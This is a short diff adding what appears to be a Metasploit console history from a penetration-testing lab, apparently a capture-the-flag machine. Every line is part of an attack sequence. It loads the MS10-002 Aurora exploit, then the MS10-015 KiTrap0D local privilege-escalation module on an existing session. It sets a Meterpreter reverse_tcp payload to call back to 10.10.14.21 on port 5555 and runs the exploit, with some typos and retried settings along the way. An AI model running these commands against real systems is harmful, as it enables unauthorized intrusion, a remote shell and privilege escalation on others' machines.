@@ -1,0 +1,18 @@
+use exploitms10_002_aurora
+use ms10_002_aurora
+sessions -i 3
+sessions -i 1
+sessions -i
+use priv
+use exploit/windows/local/ms10_015_kitrap0d
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.21
+set rhost 10.10.10.226
+set lhost 5555
+set lhost 10.10.14.21
+set lport 5555
+set rport 5000
+options
+exploit
+exit
